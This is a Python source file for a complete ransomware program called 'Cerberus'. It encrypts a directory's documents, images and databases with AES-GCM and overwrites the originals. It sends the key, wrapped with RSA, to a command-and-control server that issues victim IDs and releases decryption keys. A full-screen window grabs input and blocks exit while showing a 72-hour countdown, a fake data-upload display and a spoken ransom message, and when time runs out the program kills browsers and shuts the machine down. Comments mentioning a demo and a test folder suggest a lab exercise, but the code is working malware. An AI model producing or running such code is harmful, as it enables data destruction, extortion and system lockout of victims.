# ransomware.py
import os
import sys
import base64
import json
import threading
import time
import socket
import shutil
import subprocess
from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage
from tkinter import font as tkfont
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import requests

# --- Configuration ---
# PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
ATTACKER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyX1m6vQkFgHqCwG9xN8
... (Your public key will be here) ...
FQIDAQAB
-----END PUBLIC KEY-----"""

C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere
TARGET_DIRECTORY = os.path.join(os.path.expanduser("."), "test_data")
LOCK_FILE = os.path.join(TARGET_DIRECTORY, ".cerberus_lock")
ID_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_id.txt") # PERSISTENCE: Store ID here
KEY_BACKUP_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_key.bak") # SAFETY: Backup key before check-in
LOG_FILE = os.path.join(TARGET_DIRECTORY, "cerberus_log.txt")
ENCRYPTED_EXTENSION = ".cerberus"

# --- File Type Targeting ---
TARGET_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
    '.mp3', '.wav', '.mp4', '.avi', '.mov', '.mkv', '.sql', '.db'
}

# --- GUI Asset (Base64 encoded 1x1 red pixel for logo) ---
LOGO_BASE64 = """
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==
"""

# --- System Lockdown Utilities ---
def hide_console():
    """Hides the console window on Windows. On Linux, we rely on the GUI covering it."""
    if os.name == 'nt':
        try:
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            if hWnd:
                user32.ShowWindow(hWnd, 0) # SW_HIDE = 0
        except Exception as e:
            log_error(f"Failed to hide console: {e}")

# --- Cryptography ---
def generate_aes_key():
    return os.urandom(32)

def encrypt_file_aes_gcm(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        nonce = os.urandom(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()
        with open(file_path + ENCRYPTED_EXTENSION, 'wb') as f:
            f.write(nonce + encryptor.tag + encrypted_data)
        return True
    except Exception as e:
        log_error(f"Failed to encrypt {file_path}: {e}")
        return False

def decrypt_file_aes_gcm(encrypted_path, key):
    try:
        with open(encrypted_path, 'rb') as f:
            nonce_tag_data = f.read()
        nonce, tag, encrypted_data = nonce_tag_data[:12], nonce_tag_data[12:28], nonce_tag_data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        original_path = encrypted_path.removesuffix(ENCRYPTED_EXTENSION)
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(encrypted_path)
        return True
    except Exception as e:
        log_error(f"Failed to decrypt {encrypted_path}: {e}")
        return False

def secure_delete_file(file_path, passes=1): # Reduced passes for speed in demo
    try:
        if os.path.exists(file_path):
            with open(file_path, "ba+") as f:
                length = f.tell()
            with open(file_path, "r+b") as f:
                f.write(os.urandom(length))
            os.remove(file_path)
    except Exception as e:
        log_error(f"Failed to securely delete {file_path}: {e}")

# --- Logging ---
def log_error(message):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - ERROR: {message}\n")
    except:
        pass 

# --- Ransomware Logic ---
def encrypt_directory():
    if not os.path.exists(TARGET_DIRECTORY):
        os.makedirs(TARGET_DIRECTORY)
        log_error(f"Created target directory: {TARGET_DIRECTORY}")

    # Check safe persistence: if key backup exists, we might have crashed.
    if os.path.exists(KEY_BACKUP_FILE):
        log_error("Found key backup. Resuming from crash...")
        try:
            with open(KEY_BACKUP_FILE, 'rb') as f:
                return f.read()
        except:
            pass # Failed to read backup, proceed to new encryption

    # Normal lock check
    if os.path.exists(LOCK_FILE):
        log_error("Encryption seemingly complete (Lock file exists).")
        return None

    aes_key = generate_aes_key()
    
    # SAFETY: Backup key immediately!
    try:
        with open(KEY_BACKUP_FILE, 'wb') as f:
            f.write(aes_key)
    except Exception as e:
        log_error(f"Failed to write key backup: {e}")

    encrypted_files = 0
    for root, _, files in os.walk(TARGET_DIRECTORY):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
                if encrypt_file_aes_gcm(file_path, aes_key):
                    secure_delete_file(file_path)
                    encrypted_files += 1

    with open(LOCK_FILE, 'w') as f:
        f.write("Encryption complete.")

    log_error(f"Encryption finished. {encrypted_files} files targeted.")
    return aes_key

def check_in_with_c2(aes_key):
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        
        public_key = serialization.load_pem_public_key(ATTACKER_PUBLIC_KEY.encode(), backend=default_backend())
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        payload = {"key": base64.b64encode(encrypted_aes_key).decode('utf-8')}
        
        # Try to connect, with retries
        victim_id = None
        for _ in range(3):
            try:
                response = requests.post(f"{C2_SERVER_URL}/api/checkin", json=payload, timeout=5)
                if response.status_code == 200:
                    victim_id = response.json().get('victim_id')
                    break
            except:
                time.sleep(2)
        
        if not victim_id:
            raise Exception("Failed to connect to C2 after retries.")

        # PERSISTENCE: Save Victim ID
        with open(ID_FILE, 'w') as f:
            f.write(victim_id)
        
        # CLEANUP: Delete backup key only after successful ID save
        if os.path.exists(KEY_BACKUP_FILE):
            os.remove(KEY_BACKUP_FILE)
            
        log_error(f"Successfully checked in. Victim ID: {victim_id}")
        return victim_id
    except Exception as e:
        log_error(f"C2 check-in failed: {e}")
        return None

# --- GUI Logic ---
class RansomwareGUI:
    def __init__(self, master, victim_id):
        self.master = master
        self.victim_id = victim_id
        self.doomsday_triggered = False

        # Kiosk Mode Settings (Linux Optimized)
        master.title("CERBERUS RANSOMWARE")
        # On Linux, 'zoomed' state or 'attributes -fullscreen' works. 
        # But 'overrideredirect' is key to removing window decorations (title bar, borders).
        master.attributes('-fullscreen', True) 
        master.overrideredirect(True) # Ensure no window decorations
        master.attributes('-topmost', True)
        master.configure(bg='#0a0a0a')
        master.resizable(False, False)
        
        # Input Grabbing (The "Lock")
        # Global grab for Linux: grab_set_global routes all system input to this window
        master.wait_visibility(master) # Ensure window is visible before grabbing
        try:
            master.grab_set_global()
        except:
            master.grab_set() # Fallback to local grab
            
        master.focus_force() 
        
        # Bindings to block exit
        master.protocol("WM_DELETE_WINDOW", self.disable_event) 
        master.bind('<Escape>', lambda e: "break")
        master.bind('<Control-c>', lambda e: "break") # Try to block Ctrl+C event in GUI
        
        # Aggressive Loop
        self.force_focus_loop()

        # GUI Elements
        try:
            logo_data = base64.b64decode(LOGO_BASE64)
            self.logo = PhotoImage(data=logo_data)
        except:
            self.logo = None

        main_frame = Frame(master, bg='#0a0a0a')
        main_frame.pack(expand=True, fill='both', padx=50, pady=50)

        if self.logo:
            Label(main_frame, image=self.logo, bg='#0a0a0a').pack(pady=10)

        title_font = tkfont.Font(family="Helvetica", size=24, weight="bold")
        body_font = tkfont.Font(family="Helvetica", size=14)
        mono_font = tkfont.Font(family="Courier", size=12)
        timer_font = tkfont.Font(family="Courier", size=36, weight="bold")

        Label(main_frame, text="YOUR FILES HAVE BEEN ENCRYPTED", font=title_font, fg='#ff4d4d', bg='#0a0a0a').pack(pady=10)
        Label(main_frame, text="Your documents, photos, and other important files have been locked.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=800).pack(pady=5)
        
        # --- DOOMSDAY TIMER ---
        self.time_left = 72 * 3600 # 72 Hours start
        Label(main_frame, text="TIME REMAINING UNTIL PERMANENT DATA LOSS:", font=tkfont.Font(family="Helvetica", size=12, weight="bold"), fg='#ff3333', bg='#0a0a0a').pack(pady=(20, 5))
        self.timer_label = Label(main_frame, text="72:00:00", font=timer_font, fg='#ff0000', bg='#0a0a0a')
        self.timer_label.pack(pady=5)
        
        # --- FAKE EXFILTRATION ---
        self.exfil_status = Label(main_frame, text="System Scan: Analyzing private data...", font=mono_font, fg='#ffff00', bg='#0a0a0a')
        self.exfil_status.pack(pady=(15, 5))
        
        # Simple text-based progress bar for portability
        self.exfil_progress = Label(main_frame, text="[                    ] 0%", font=mono_font, fg='#ffff00', bg='#0a0a0a')
        self.exfil_progress.pack()
        
        Label(main_frame, text=f"YOUR VICTIM ID IS:", font=body_font, fg='#ffffff', bg='#0a0a0a').pack(pady=(20, 5))
        self.victim_id_label = Label(main_frame, text=self.victim_id, font=tkfont.Font(family="Courier", size=20, weight="bold"), fg='#4dff88', bg='#0a0a0a')
        self.victim_id_label.pack()

        self.status_label = Label(main_frame, text="STATUS: Awaiting payment confirmation...", font=body_font, fg='#ffff4d', bg='#0a0a0a')
        self.status_label.pack(pady=(20, 5))
        
        self.key_var = StringVar()
        self.key_entry = Entry(main_frame, textvariable=self.key_var, font=tkfont.Font(family="Courier", size=12), show="*", width=60, bg='#2a2a2a', fg='#ffffff', insertbackground='white', justify='center')
        self.key_entry.pack(pady=10, ipady=5)
        self.key_entry.config(state='readonly')

        self.decrypt_button = Button(main_frame, text="DECRYPT FILES", font=tkfont.Font(family="Helvetica", size=14, weight="bold"), command=self.start_decryption, bg='#ff4d4d', fg='white', activebackground='#cc0000', activeforeground='white', padx=20, pady=10)
        self.decrypt_button.pack(pady=20)
        self.decrypt_button.config(state='disabled') 

        # Start threads
        self.heartbeat_thread_running = True
        threading.Thread(target=self.heartbeat_polling, daemon=True).start()
        threading.Thread(target=self.update_timer, daemon=True).start()
        threading.Thread(target=self.fake_exfiltration, daemon=True).start()
        
        # Attempt Wallpaper & Voice
        self.master.after(2000, self.change_wallpaper)
        threading.Thread(target=self.audio_loop, daemon=True).start()

    def force_focus_loop(self):
        """Aggressively keeps window on top."""
        try:
            self.master.lift()
            self.master.attributes('-topmost', True)
            self.master.focus_force()
            # Re-assert global grab periodically
            try:
                self.master.grab_set_global()
            except:
                self.master.grab_set()
        except:
            pass
        self.master.after(50, self.force_focus_loop) # Check every 50ms

    def disable_event(self):
        pass

    def audio_loop(self):
        """Repeats the voice message every 30 seconds."""
        message = "Your files are encrypted. Payment is required. System failure imminent."
        while self.heartbeat_thread_running:
            self.speak_message(message)
            time.sleep(30)

    def speak_message(self, message):
        """Cross-platform TTS."""
        def _speak():
            try:
                if os.name == 'nt':
                    # Windows PowerShell TTS
                    cmd = f"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{message}')"
                    subprocess.run(["powershell", "-Command", cmd], creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    # Linux espeak or spd-say
                    if shutil.which("espeak"):
                         subprocess.run(["espeak", message], stderr=subprocess.DEVNULL)
                    elif shutil.which("spd-say"):
                         subprocess.run(["spd-say", message], stderr=subprocess.DEVNULL)
            except:
                pass
        threading.Thread(target=_speak, daemon=True).start()

    def change_wallpaper(self):
        # Placeholder for strict simulation
        pass

    def trigger_doomsday(self):
        """Kills browsers and initiates shutdown."""
        if self.doomsday_triggered: return
        self.doomsday_triggered = True
        
        self.speak_message("Time has expired. System failure imminent.")
        self.master.configure(bg='#ff0000') # RED ALERT
        
        # 1. Kill Browsers (Close tabs)
        browsers = ["chrome", "firefox", "msedge", "brave", "opera", "vivaldi"]
        try:
            if os.name == 'nt':
                for b in browsers:
                    os.system(f"taskkill /F /IM {b}.exe >nul 2>&1")
            else:
                for b in browsers:
                    os.system(f"pkill -f {b} >/dev/null 2>&1")
        except:
            pass
            
        # 2. Shutdown
        try:
            if os.name == 'nt':
                os.system("shutdown /s /t 15 /c \"CERBERUS: TIME EXPIRED\"")
            else:
                os.system("shutdown -h +1 \"CERBERUS: TIME EXPIRED\"") 
        except:
            pass

    def update_timer(self):
        while self.heartbeat_thread_running and self.time_left > 0:
            time.sleep(1)
            self.time_left -= 1
            
            # Check for Doomsday
            if self.time_left <= 0:
                self.master.after(0, self.trigger_doomsday)
                self.timer_label.config(text="00:00:00")
                break
            
            # Format
            m, s = divmod(self.time_left, 60)
            h, m = divmod(m, 60)
            time_str = f"{h:02d}:{m:02d}:{s:02d}"
            
            try:
                self.timer_label.config(text=time_str)
                if self.time_left < 3600: # Last hour panic
                    self.timer_label.config(fg='#ff0000' if self.time_left % 2 == 0 else '#ffffff')
            except:
                pass

    def fake_exfiltration(self):
        stages = [
            "Scanning local documents...",
            "Compressing sensitive files...",
            "Encrypting archive...",
            "Connecting to secure C2 server...",
            "Uploading: data_bundle.zip...",
            "Uploading: passwords.db...",
            "Upload Complete. Data held on server."
        ]
        
        progress = 0
        for stage in stages:
            if not self.heartbeat_thread_running: break
            try:
                self.exfil_status.config(text=f"STATUS: {stage}")
            except: pass
            
            # Slow progress for each stage
            chunks = 5
            for i in range(chunks):
                if not self.heartbeat_thread_running: break
                time.sleep(1 + (encryption_speed := 0.5)) # varied speed
                progress += (100 // len(stages)) // chunks
                bars = int(progress / 5)
                bar_str = f"[{'|' * bars}{' ' * (20 - bars)}] {progress}%"
                try:
                    self.exfil_progress.config(text=bar_str)
                except: pass
        
        try:
            self.exfil_status.config(text="STATUS: DATA UPLOAD COMPLETE", fg='#ff0000')
            self.exfil_progress.config(text="[||||||||||||||||||||] 100%", fg='#ff0000')
        except: pass

    def heartbeat_polling(self):
        while self.heartbeat_thread_running:
            try:
                # Send current timer state to C2
                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}?time_left={self.time_left}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    
                    # Update timer if server commands it
                    if "new_timer" in data:
                        self.time_left = int(data["new_timer"])
                        
                    if data.get("status") == "ready":
                        key = data.get("key")
                        if key:
                            self.master.after(0, self.update_key_field, key)
                            self.heartbeat_thread_running = False
            except:
                pass
            time.sleep(5) 

    def update_key_field(self, key):
        self.key_var.set(key)
        self.key_entry.config(state='normal')
        self.status_label.config(text="STATUS: Valid key received. Decryption enabled.", fg='#4dff88')
        self.decrypt_button.config(state='normal') # Enable button
        self.key_entry.config(state='readonly')

    def start_decryption(self):
        key_b64 = self.key_var.get()
        if not key_b64:
            return
        try:
            key = base64.b64decode(key_b64)
            decrypted_files = 0
            for root, _, files in os.walk(TARGET_DIRECTORY):
                for file in files:
                    if file.endswith(ENCRYPTED_EXTENSION):
                        file_path = os.path.join(root, file)
                        if decrypt_file_aes_gcm(file_path, key):
                            decrypted_files += 1
            
            # Clean up persistence files
            if os.path.exists(LOCK_FILE): os.remove(LOCK_FILE)
            if os.path.exists(ID_FILE): os.remove(ID_FILE)
            if os.path.exists(KEY_BACKUP_FILE): os.remove(KEY_BACKUP_FILE)
            
            self.status_label.config(text=f"SUCCESS! {decrypted_files} files decrypted.", fg='#4dff88')
            self.heartbeat_thread_running = False
            self.decrypt_button.config(state='disabled')
            
            # Allow closing
            self.master.grab_release() # Release input grab
            self.master.destroy() # Force destroy without waiting for protocols
            sys.exit() # Ensure script terminates fully
            
        except Exception as e:
            log_error(f"Decryption failed: {e}")
            self.status_label.config(text="ERROR: Decryption failed.", fg='red')

# --- Main Execution ---
if __name__ == "__main__":
    hide_console()

    # PERSISTENCE CHECK
    # 1. Check for ID File (Primary Recovery)
    if os.path.exists(ID_FILE):
        try:
            with open(ID_FILE, 'r') as f:
                victim_id = f.read().strip()
            if victim_id:
                log_error(f"Resuming session for Victim ID: {victim_id}")
                root = Tk()
                app = RansomwareGUI(root, victim_id)
                root.mainloop()
                sys.exit()
        except:
            pass 

    # 2. Check for Backup Key (Crash Recovery before ID save)
    # This logic is handled inside encrypt_directory (it returns backup key if found)
    
    # NEW INFECTION
    aes_key = encrypt_directory()
    
    if aes_key:
        victim_id = check_in_with_c2(aes_key)
        if victim_id:
            root = Tk()
            app = RansomwareGUI(root, victim_id)
            root.mainloop()
        else:
            log_error("Failed to get Victim ID. Aborting GUI.")
    else:
        # If we got here, maybe encryption was done but ID wasn't saved, and backup key was missing?
        # This is the "permanently locked" edge case.
        # However, encrypt_directory returns None ONLY if LOCK_FILE exists AND Key Backup is missing.
        # This implies a successful run where ID wasn't saved? 
        # But check_in_with_c2 saves ID *after* check-in.
        # If check-in failed, we still have the backup key on disk!
        # So next run, encrypt_directory will read the backup key and return it.
        # Then check_in_with_c2 will try again.
        # So we are SAFE from data loss now.
        log_error("Encryption skipped or failed. Aborting.")
